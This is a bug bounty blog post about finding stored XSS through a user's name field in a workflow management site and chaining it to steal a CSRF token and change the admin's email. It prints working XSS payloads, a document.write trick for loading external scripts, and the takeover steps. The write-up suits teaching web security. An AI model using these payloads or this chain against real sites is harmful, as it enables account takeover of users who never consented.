---
layout: default
title: Stored XSS to CSRF 
description: There's much more to XSS than just an alert !
date:   2020-05-21 
date_only: May 21, 2020
permalink: /stored-xss-to-csrf/
reading_time: 6 minutes
image: /assets/images/stored-xss-to-csrf/poc.png
---
<head>
  <link rel="stylesheet" href="/assets/css/main1.css">
  <!-- Latest compiled and minified CSS -->
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css">

  <!-- jQuery library -->
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

  <!-- Popper JS -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>

  <!-- Latest compiled JavaScript -->
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"></script>
  

  <title>{{ page.title }}</title>
  <style>
    .content{
        font-size: 20px;
    }
   
  </style>
</head>

<section id="one" class="wrapper style1">
  <div class="inner">
    
    <article class="feature left" style="background-color: white; color: black;">
        <center style="padding-bottom: 20px;">
            <h2 style="padding: 20px; color: black;"><b>{{ page.title }}</b></h2>
            <div style="color:#0067a3">
              {{ page.date_only }}
              <br />
              ~{{ page.reading_time }}
            </div>
            
        </center>
        <div class="content" style="padding:10px;">
            <p>
                There's almost no limit what you can do with XSS, stored XSS in particular, in most of the situations. It allows javascript code execution in the victim's browser. XSS is not just about popping an alert box and stealing cookies is just one method, which is decreasing because many websites have HttpOnly flag on their cookies which protects them. In that case, if you don't know exploiting it other than stealing cookies, even though your submission would be accepted, you could be missing out on high impacts, like account takeover. 
                <br ><br >

                I received an invite for a private program a few days back. It was a workflow management websites, where you could assign your team members project, and upload files, and other stuff with different levels of users. I decided to hack on it, as these kind of different user privileges super excites me due to the large scope of privilege escalation.

                So, I started browsing the site understanding it's functionality. Now, there was a project section, where users could keep their project private, or add some of their team members in it. There was a functionality to add comments to the project, and the members added in the project had the option to add like to the comment. But knowing the project ID, I was able to add likes to a project, which I was not a part of, and had no visibility permissions. I reported this, and I received a response stating that the project ID is not predictable, and status was changed to "Won't fix" and it got me only 5 points☹️

                Next, there was a functionality to search other users, by their username. The endpoint was something like 
            </p>
            <center>
                <img src="/assets/images/stored-xss-to-csrf/api_request.png" alt="" height="30%" width="80%" />
            </center>
            <br /><br />
            <p>
                I have stripped out a lot of other things for simplicity. This would return a response containing all the users whose name starts with "micha" like michaelben, michael etc.
                So the response was something like
            </p>
            <center>
                <img src="/assets/images/stored-xss-to-csrf/api_response.png" alt="" height="30%" width="80%" />
            </center>
            <br ><br >
            <p>
                Again, the response contained a lot of other data, among which this was the most interesting ones. On a first glance, I thought this is leaking the address and mobile numbers of other team members, but later realised that they were actually visible on their profile.
                <br />
                Then the LIMIT parameter in the GET request caught my eyes, and I changed it to 1000. I got a hell lot of data regarding each of the team member. The response included the name of private documents uploaded by each user which was visible only to the user. Additionally, there were other details that the endpoint leaked such as private projects, and other information which were supposed to visible only to the particular user. 
                <br />
                On reporting this, I got a reply saying this was by design ! 😨
                Obviously, I couldn't do anything.
            </p>
            <br ><br >
            <p>
                I previously injected the XSS payload, <pre>"><img src onerror=alert(1)></pre> in one of the members name to test XSS, and it obviously didn't fire. I was just browsing using the admin account. I visited the member's profile with the payload. There was an option to deactivate the user. After deactivating, you receive a pop up saying "Deactivated {member name}". But when I deactivated this user, I got an invalid image symbol. I found this interesting. There are two possibilities which is mostly implemented in such a situation. One would be render the whole payload safely by some kind of filtering, and the other would be to completely remove the payload. But this removed only the tag , and so it loooked like <pre style="display: inline;">< img src=""></pre>. It was vulnerable to HTML and CSS injection, I could take down the whole page using <pre>< style>body{display: none}</style></pre>. But I was aiming XSS.

                I tried to bypass this, but I couldn't. I decided to look at the source code. I knew that it was parsing my HTML tags. The notification content was enclosed within a div tag. I immediately closed the div tag, and entered my payload. So the final payload was <pre>"></div><img src onerror=alert(document.domain)</pre>.

                Now when I deactivated the user with this payload, the payload fired. But I could not get the session cookies using this method, due to the HttpOnly flag. But I could get the CSRF token, using which I could change the admin email address. But again, since everything was against me, I was limited by the number of characters in the name where the payload must be injected. 

                So, I thought of referencing an external script to the page. I did <pre>document.getElementById("id").innerHTML = '< script src="http://localhost/alert.js"></script>'</pre>, where alert.js contained alert(document.domain), which would fire if the script was included. But it didn't. On more researching onto this, I found that scripts do not load in an already loaded page using the innerHTML method. Alternatively, using <pre>document.write("< script src='http://localhost/alert.js'></script>")</pre> could achieve it. I did that, and I got the alert. 
                Now just a simple POC.
            </p>
            <br ><br >
            <center>
                <img src="/assets/images/stored-xss-to-csrf/poc.png" alt="" height="30%" width="80%" />
            </center>
            <br /><br />
            <p>
                <ul>
                    <li>Get the cookie string</li>
                    <li>Extract only the value of CSRF-TOKEN from the string</li>
                    <li>Send the POST request to change the email address with the CSRF-TOKEN in the header</li>
                </ul>
                Just don't stop with an alert box if you find XSS. It has a lot more potential. 
                <br>
                See you again in the next blog post :)
            </p>
        </div>
        Share: <a class="icon fa-twitter" target="_blank"
      href="https://twitter.com/intent/tweet?text=Check out {{ page.title }} by micha3lb3n at https://micha3lb3n.github.io{{ page.permalink }}" data-size="large" url="https://micha3lb3n.github.io/">
    Tweet</a>
        <br /><br />
        
    </article>
